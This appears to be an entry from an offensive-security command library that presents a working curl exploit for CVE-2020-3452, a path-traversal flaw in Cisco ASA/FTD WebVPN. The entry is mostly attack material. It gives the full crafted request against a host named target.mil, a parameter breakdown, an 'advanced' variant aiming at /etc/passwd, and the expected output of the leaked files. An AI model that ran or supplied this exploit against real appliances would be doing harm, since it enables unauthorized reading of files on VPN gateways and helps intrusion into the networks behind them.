---
id: cmd-curl-traversal-cisco
data: >-
  curl -i -s -k -X $'GET' -H $'Host: target.mil' -H $'User-Agent: Mozilla/5.0
  (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H
  $'Referer: https://target.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H
  $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H
  $'Upgrade-Insecure-Requests: 1' -b $'webvpnlogin=1; webvpnLang=en'
  $'https://target.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
tags:
  - web-exploit
  - path-traversal
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.423Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-cisco-vpn

## Command

```bash
curl -i -s -k -X $'GET' -H $'Host: target.mil' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://target.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H $'Upgrade-Insecure-Requests: 1' -b $'webvpnlogin=1; webvpnLang=en' $'https://target.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
```

## Description

This command exploits a path traversal vulnerability in Cisco VPN Service by sending a crafted HTTP GET request to the translation-table endpoint, using '../' in the 'lang' parameter to read sensitive files like portal_inc.lua. Use it for testing CVE-2020-3452 on vulnerable ASA/FTD appliances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP response headers in output | Yes |
| `-s` | Silent mode: suppress progress meter and error messages | Yes |
| `-k` | Allow connections to SSL sites without cert verification | Yes |
| `-X GET` | Specify HTTP method as GET | Yes |
| `-H` | Set custom headers (e.g., Host, User-Agent, Accept, Referer, Cookie) to mimic browser | Yes |
| `-b` | Set cookies (webvpnlogin=1; webvpnLang=en) for session emulation | Yes |
| URL | Target endpoint with traversal payload in 'lang=../' | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X GET -H 'Host: target.mil' ... https://target.mil/+CSCOT+/translation-table?lang=../
```

### Advanced Usage

```bash
# Target different file by adjusting textdomain
curl -i -s -k ... $'https://target.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/another_file.lua&lang=../../../etc/passwd'
```

## Expected Output

HTTP/1.1 200 OK followed by response headers and the raw contents of the traversed file (e.g., Lua script code). If unsuccessful, expect 404 or empty body. Pipe to a file for analysis: `curl ... > file.txt`.

## Related

- [[Related Procedure|procedures/Exploit-Cisco-VPN-Path-Traversal]]
- [[Related Command|commands/curl-basic-http]]
